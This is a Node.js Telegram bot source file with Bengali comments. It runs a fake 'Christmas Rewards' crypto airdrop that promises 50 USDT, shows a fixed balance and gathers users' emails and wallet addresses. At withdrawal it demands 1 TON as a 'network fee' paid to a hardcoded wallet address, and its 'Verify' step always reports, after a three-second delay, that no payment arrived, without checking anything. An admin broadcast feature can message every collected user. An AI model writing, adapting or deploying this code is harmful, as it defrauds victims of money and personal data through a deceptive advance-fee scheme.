const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const mongoose = require('mongoose');
const app = express();

// --- কনফিগারেশন ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const MONGO_URI = process.env.MONGO_URI; // <password> এর জায়গায় আপনার পাসওয়ার্ড দিন
const ADMIN_ID = process.env.ADMIN_ID // আপনার টেলিগ্রাম আইডি এখানে দিন

const bot = new Telegraf(BOT_TOKEN);

// --- MongoDB সেটআপ ---
mongoose.connect(MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected!'))
    .catch(err => console.log('❌ MongoDB Connection Error:', err));

const User = mongoose.model('User', new mongoose.Schema({
    userId: { type: Number, unique: true },
    firstName: String,
    username: String,
    email: String,
    wallet: String,
    step: { type: String, default: 'start' }
}));

// --- বট লজিক ---

// ১. স্টার্ট কমান্ড
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    // ডাটাবেসে ইউজার সেভ করা (যদি আগে না থাকে)
    await User.findOneAndUpdate(
        { userId },
        { firstName: ctx.from.first_name, username: ctx.from.username, step: 'start' },
        { upsert: true, new: true }
    );

    console.log(`[NEW USER] ${ctx.from.first_name} joined.`);
    
    ctx.reply(`👋 Hello, ${ctx.from.first_name}! Welcome to Christmas Rewards Bot\n\n🎁 Joining Reward: 50 USDT\n👥 Each Referral: 5 USDT\n\n📢 Must Complete Mandatory Tasks:\n\n🔹 Join our Telegram Channel: @Christmas_Rewards\n\n🗒️ After completing task click on [Continue] to proceed`, 
    Markup.keyboard([['🟢 Continue']]).resize());
});

bot.hears('🟢 Continue', (ctx) => {
    ctx.reply('🔹 Join @Christmas_Rewards\n\nAfter completing task click on [Done]', 
    Markup.keyboard([['✅ Done']]).resize());
});

bot.hears('✅ Done', async (ctx) => {
    await User.updateOne({ userId: ctx.from.id }, { step: 'email' });
    ctx.reply('🔹 Follow Binance Twitter Page\n🔹 Follow Binance Instagram Page\n\nSubmit Your Email ID To Proceed:', Markup.removeKeyboard());
});

// ২. টেক্সট মেসেজ হ্যান্ডলার
bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id;
    const user = await User.findOne({ userId });

    if (!user) return;

    // --- অ্যাডমিন ব্রডকাস্ট ফিচার ---
    if (text.startsWith('/broadcast ') && userId === ADMIN_ID) {
        const broadcastMsg = text.replace('/broadcast ', '');
        const allUsers = await User.find({});
        let successCount = 0;

        for (const u of allUsers) {
            try {
                await bot.telegram.sendMessage(u.userId, broadcastMsg);
                successCount++;
            } catch (e) {
                console.log(`Could not send to ${u.userId}`);
            }
        }
        return ctx.reply(`📢 Broadcast complete! Sent to ${successCount} users.`);
    }

    // --- জেনারেল বাটনসমূহ ---
    if (text === '💰 Balance') {
        return ctx.reply(`🤴 User : ${ctx.from.first_name}\n\nYour Balance: 50 USDT`);
    }

    if (text === '↘️ Withdraw') {
        await User.updateOne({ userId }, { step: 'withdraw_wallet' });
        return ctx.reply('✅ Now Submit Your USDT (Ton) Wallet Address:');
    }

    if (text === '✅ Confirm') {
        return ctx.reply(`📃 Please send 1 Ton as network fee.\n\nAddress :- UQAGu8dbpHzjFmy7GtZXg4fuchEU4X1-WVDlNkOHWBiIRMwr\n\n⚠️ Note: After send transaction fee click on [Verify]`, 
        Markup.keyboard([['☑️ Verify']]).resize());
    }

    if (text === '☑️ Verify') {
        ctx.reply('🖐️ Hold on checking your transaction......');
        setTimeout(() => {
            ctx.reply('❎ We haven\'t received transaction fee.');
        }, 3000);
        return;
    }

    // --- ইনপুট ভ্যালিডেশন ---
    if (user.step === 'email') {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(text)) {
            return ctx.reply('❌ Invalid Email! Please send a valid email:');
        }
        await User.updateOne({ userId }, { email: text, step: 'wallet' });
        return ctx.reply('➡️ Submit Your USDT (BEP-20) Wallet Address:');
    }

    if (user.step === 'wallet') {
        await User.updateOne({ userId }, { wallet: text, step: 'completed' });
        return ctx.reply('🎉 Successfully joined!', Markup.keyboard([['💰 Balance', '↘️ Withdraw']]).resize());
    }

    if (user.step === 'withdraw_wallet') {
        await User.updateOne({ userId }, { step: 'ready' });
        return ctx.reply(`➡️ Balance 50 USDT\nClick Confirm to proceed.`, Markup.keyboard([['✅ Confirm']]).resize());
    }
});

// Render ও পোর্ট সেটআপ
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is Live with Database!'));
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    bot.launch();
});
